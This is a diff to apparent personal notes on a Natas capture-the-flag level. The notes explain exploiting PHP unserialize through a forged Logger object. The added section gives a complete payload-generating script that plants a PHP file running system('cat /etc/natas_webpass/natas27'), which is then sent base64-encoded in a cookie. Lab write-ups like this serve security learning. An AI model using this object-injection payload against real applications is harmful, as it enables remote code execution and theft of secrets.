@@ -35,8 +35,55 @@ in the output we get PHP serialized data
 
 this class logger we can actually change what these variables are and what they do, and if we give that to the drawing cookie and the PHP application will like unserialize that data for us, it'll load up this logger and we'll try and write that message and we may be able to take advantage of what we actually write to a file and we can essentially get some code on the server and maybe run our own PHP code because we are writing to a file with this.
 
+create a php file and copy the snippet of `logger `class 
+```
+<?php
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+        
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
+            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
+            $this->logFile = "img/winner.php";
+//above we create a custom initalise message and log it to file we can access later
+// we write to img because it is trying to load out of that image directory 
 
-in order to run php directly on kali 
+			// write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+        
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+        
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+$object = new Logger();
+echo(base64_encode(serialize($object)));
+?>
+```
+ 
+in order to run php directly on kali  - 
+```
+php7.0 file_name.php 2>/dev/null
+```
+the output will be a base64 string 
+we set that b64 string to our drawing cookie 
+
+after doing this we encounter a fatal error, we know that this means that our code successfully executed we know that we got that object to unserialized
+
 
 
 
